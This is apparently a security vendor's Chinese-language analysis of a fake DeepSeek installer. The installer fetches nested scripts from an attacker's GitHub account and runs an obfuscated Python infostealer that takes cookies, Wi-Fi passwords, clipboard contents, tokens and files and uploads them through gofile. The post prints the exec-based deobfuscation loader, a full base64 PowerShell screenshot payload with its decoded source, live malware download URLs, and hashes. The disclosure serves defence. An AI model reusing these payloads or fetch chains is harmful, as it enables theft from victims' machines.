---
title: 警惕，黑客借助DeepSeek热潮投放后门木马窃取用户密码
date: 2025-02-14 12:00:00
tags:
---


# 背景
在日常样本巡逻中，我们在今天发现了一个名为`Install_DeepSeek.exe`的可疑样本在传播，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/172639de4fohezds6eohfa.png)

该样本打着DeepSeek的图标，无有效数字签名，pdb路径为`C:\Users\Administrator\source\repos\Bind\Bind\obj\Release\Bind.pdb`，这引起了我们的警觉和怀疑，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/172651we9eesxh1uae7eus.png)

经过分析，我们确定，该样本会从黑客GitHub仓库中下载多层脚本和下载者，嵌套下载，最终通过下载得到一个使用Python编写的恶意脚本用于执行后门行为并窃取密码。截至本文撰写时该py脚本首次在VirusTotal多引擎扫描平台上传并扫描，静态检出率为0%，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/173519r1qwnwz9uwtb3iiu.png)

同时，我们发现黑客的GitHub账户上有多个类似的仓库，均在几个月或几周前上传了恶意软件，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/173543tomzgzny76ybzqov.png)


# 样本分析

`Install_DeepSeek.exe`的主要行为是下载`https://github.com/nvslks/g/raw/refs/heads/g/g.zip`，如下图所示：
![](![](https://bbs.huorong.cn/data/attachment/forum/202502/14/173634f27e5heu6xe67w5w.png)

在`https://github.com/nvslks/g`仓库中有一个`Bind.exe`，经过分析后确认行为与上述`Install_DeepSeek.exe`基本一致，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/173659xo6oyc7wazw6c5ic.png)

我们将`g.zip`下载后分析，发现里面压缩了一个`g.bat`，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/173841ctbsrmaspmsislq1.png)

`g.bat`的行为依次是：
1. 下载`https://github.com/nvslks/g/raw/refs/heads/g/1.zip`
2. 将下载到的文件保存为`%TEMP%\4g5h790g2345h7890g2345h90g2345h-890v2345hf789-3v5h.zip`
3. 使用PowerShell解压缩`%TEMP%\4g5h790g2345h7890g2345h90g2345h-890v2345hf789-3v5h.zip`至`%TEMP%`
4. 隐藏执行PowerShell，启动`%TEMP%\1.bat`，然后退出
如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174245k2bswqj3escsmjss.png)

在`1.zip`之中，我们发现里面携带了一个Python环境，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174405dtagtqo7t9b2gjgb.png)

其中，压缩包内伪装的`svchost.exe`是`Python 3.11.150.1013`解释器，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174438t9z2w8b5va2mstv2.png)
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174445i6vec5ivfedd9vdz.png)

`1.bat`的作用是：使用压缩包内携带的Python解释器执行同目录下的`python.py`，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174515nsxycrsjwsnv1zzm.png)

该恶意软件的核心组件就是该`python.py`，我们对其进行分析。
进入`python.py`后，我们发现代码可能经过了混淆或最小化处理，无法直接进行阅读，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174556ol88mcttjka9ol42.png)
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174612ei93whay9qe8qw89.png)

样本将代码字符转换为了列表中的数字，将列表存储进`xlicesvaoy`变量中，执行时再通过以下代码还原出原先的代码并执行：
```
xlicesvaoy = ''.join([chr(int(x) - 79) for x in xlicesvaoy])  // 将列表中的数字还原为代码字符
exec(xlicesvaoy)  // 通过exec()函数直接执行当前xlicesvaoy变量中的代码
```

我们将`xlicesvaoy`列表复制出来，执行`decoded = ''.join(chr(int(n)-79) for n in xlicesvaoy)`再将`decoded`输出或写入至文件就可以得到该Python脚本的可读代码，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174717otz112tftvp12qt2.png)

代码中的常量，如下图所示（木马后续的代码逻辑可能会见到，因此先进行展示）：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174734jr34ifvmtl4470jm.png)

进入代码后，首先最令人难忘的是一堆`brouwser_paths`，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174801v9tai8nrgi0pt8ej.png)
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/174808bb4cz9gr4f5okmrm.png)

在此之后紧接着的是`class Maincookie`，该class下的函数会寻找浏览器和浏览器`User Data`位置，尝试使用命令行`taskkill /f /im ProcessName`的方式结束正在运行的浏览器进程；命令行参数指定User Data目录，以调试模式启动浏览器进程；提取并保存浏览器cookies，压缩为zip（获取国家和IP地址作为zip压缩包文件名）并上传发送给黑客，相关代码如下图所示：
![](https://s21.ax1x.com/2025/02/14/pEKE4e0.png)

之后一个`class Variables`用于初始化变量，从变量名中可以看到该后门木马会尝试获取浏览器Cookies、浏览器历史记录、浏览器文件下载记录、浏览器书签、无线局域网SSID及密码、系统信息、剪贴板内容、进程列表、一些社交软件&游戏平台账号Tokens等，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/175827n1m11m8cjf9f4m1h.png)

`class SubModules`下的函数主要进行一些加解密操作（例如解密密码等）、创建互斥体、判断当前状态下是否具有管理员权限等，相关代码如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/175841dybhz88k3y308leh.png)

接下来是`class StealSystemInformation`下的函数：
1. `GetDefaultSystemEncoding(self)`函数在`cmd.exe`中执行`chcp`命令获取当前系统`cmd`命令行输出内容的编码方式。
2. `StealSystemInformation(self)`函数通过命令行执行并输出`System Info`(systeminfo, 系统信息)&`tasklist`(进程列表)&`tasklist /svc`(进程和服务的对应关系)&`ipconfig`(TCP/IP配置的设置值)&`ipconfig/all`(TCP/IP配置的详细信息)&`Route Table`(路由表)&`route print`(当前路由表中的所有条目)&`Firewallinfo`(防火墙信息)等。
3. `StealProcessInformation(self)`函数通过执行`tasklist /FO LIST`命令获取`list`格式的当前进程列表。
4. `StealLastClipBoard(self)`函数通过执行`PowerShell`中`Get-Clipboard`命令获取当前剪贴板内容
5. `StealNetworkInformation(self)`函数获取IP地址、国家、城市、时区、运营商
6. `StealWifiInformation(self)`函数获取本地无线局域网信息、无线局域网SSID及密码
相关代码如下图所示：
![](https://s21.ax1x.com/2025/02/14/pEKEfLq.png)

该木马程序的核心实现部分在`class Main`下，Main class下的变量和函数非常多，不再一一展示，Main class的结构大纲如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/181445jrdm3dlrsvnl6v1j.png)

需要特别提及的是，该木马获取屏幕截图是在Main class下的`WriteToText(self)`函数下，通过执行`base64`编码过的`PowerShell`命令：
```
command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAUwBjAHIAZQBlAG4AcwBoAG8AdAANAAoAewANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AIABDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAHIAZQBzAHUAbAB0AHMAIAA9ACAAbgBlAHcAIABMAGkAcwB0ADwAQgBpAHQAbQBhAHAAPgAoACkAOwANAAoAIAAgACAAIAAgACAAIAAgAHYAYQByACAAYQBsAGwAUwBjAHIAZQBlAG4AcwAgAD0AIABTAGMAcgBlAGUAbgAuAEEAbABsAFMAYwByAGUAZQBuAHMAOwANAAoAIAAgACAAIAAgACAAIAAgAGYAbwByAGUAYQBjAGgAIAAoAFMAYwByAGUAZQBuACAAcwBjAHIAZQBlAG4AIABpAG4AIABhAGwAbABTAGMAcgBlAGUAbgBzACkADQAKACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AHIAeQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAGUAYwB0AGEAbgBnAGwAZQAgAGIAbwB1AG4AZABzACAAPQAgAHMAYwByAGUAZQBuAC4AQgBvAHUAbgBkAHMAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEIAaQB0AG0AYQBwACAAYgBpAHQAbQBhAHAAIAA9ACAAbgBlAHcAIABCAGkAdABtAGEAcAAoAGIAbwB1AG4AZABzAC4AVwBpAGQAdABoACwAIABiAG8AdQBuAGQAcwAuAEgAZQBpAGcAaAB0ACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdQBzAGkAbgBnACAAKABHAHIAYQBwAGgAaQBjAHMAIABnAHIAYQBwAGgAaQBjAHMAIAA9ACAARwByAGEAcABoAGkAYwBzAC4ARgByAG8AbQBJAG0AYQBnAGUAKABiAGkAdABtAGEAcAApACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABnAHIAYQBwAGgAaQBjAHMALgBDAG8AcAB5AEYAcgBvAG0AUwBjAHIAZQBlAG4AKABuAGUAdwAgAFAAbwBpAG4AdAAoAGIAbwB1AG4AZABzAC4ATABlAGYAdAAsACAAYgBvAHUAbgBkAHMALgBUAG8AcAApACwAIABQAG8AaQBuAHQALgBFAG0AcAB0AHkALAAgAGIAbwB1AG4AZABzAC4AUwBpAHoAZQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAcgBlAHMAdQBsAHQAcwA7AA0ACgAgACAAIAAgAH0ADQAKAH0ADQAKACIAQAANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoAJABzAGMAcgBlAGUAbgBzAGgAbwB0AHMAIAA9ACAAWwBTAGMAcgBlAGUAbgBzAGgAbwB0AF0AOgA6AEMAYQBwAHQAdQByAGUAUwBjAHIAZQBlAG4AcwAoACkADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA="
```
解码后命令为：
```
$source = @"

using System;

using System.Collections.Generic;

using System.Drawing;

using System.Windows.Forms;

public class Screenshot

{

    public static List<Bitmap> CaptureScreens()

    {

        var results = new List<Bitmap>();

        var allScreens = Screen.AllScreens;

        foreach (Screen screen in allScreens)

        {

            try

            {

                Rectangle bounds = screen.Bounds;

                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))

                {

                    using (Graphics graphics = Graphics.FromImage(bitmap))

                    {

                        graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);

                    }

                    results.Add((Bitmap)bitmap.Clone());

                }

            }

            catch (Exception)

            {

            }

        }

        return results;

    }

}

"@

Add-Type -TypeDefinition $source -ReferencedAssemblies System.Drawing, System.Windows.Forms

$screenshots = [Screenshot]::CaptureScreens()

for ($i = 0; $i -lt $screenshots.Count; $i++){

    $screenshot = $screenshots[$i]

    $screenshot.Save("./Display ($($i+1)).png")

    $screenshot.Dispose()

}
```
如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/181622inolu9u2m2mnzxl0.jpg)

`class UploadGoFile`下的`upload_file(file_path)`函数会将待上传的文件上传到`https://store1.gofile.io/contents/uploadfile`，然后获取到文件分享链接，之后程序再将文件分享链接上传发送给黑客，相关代码如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/181710e6i2n0m8200rnmli.png)

`class StealCommonFiles`下的函数会根据文件内容、文件大小、文件拓展名等文件特征选择性窃取文件，压缩为zip并上传发送给黑客（将国家、IP地址和文件所在驱动器号作为zip压缩包文件名），相关代码、关键词、文件拓展名，如下图所示：
![](https://s21.ax1x.com/2025/02/14/pEKVsn1.png)

程序在启动时会直接执行`Maincookie` `Main` class 下的函数和`StealCommonFiles().StealFiles()`，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202502/14/181807lhlqmruulu1m9s6x.png)

# 附录

**（一）恶意行为者资产**
GitHub账户：https://github.com/nvslks
相关GitHub仓库：
https://github.com/nvslks/g (本文分析样本)
https://github.com/nvslks/h
https://github.com/nvslks/f
https://github.com/nvslks/b
https://github.com/nvslks/a
https://github.com/nvslks/c
https://github.com/nvslks/e
https://github.com/nvslks/d
截至本文撰写时仍然可访问。
**（二）本文分析样本Hash (SHA-256)**
Install_DeepSeek.exe - c9d815df845f5e13e8ef1142cb2dec8f97a449d639be2b38bdd75beaacff70b8
Bind.exe - 9d09a10bfa2aeb89aba5e20e88fb4fc1f56392d859d0592db66221a9f00000c4
g.bat - 25696f0af2570b4ab6013ff7dcb6995dcfaff31323ad05b268a680a2411ccf0a
1.bat - 1003d1b243a01a0a518491d0af6c67e33b8d904762b5de167b39acec05ca46f4
python.py - f6d47d223401627eb4978b7582368854d271d6446b3137dac5ce99cb46efd886
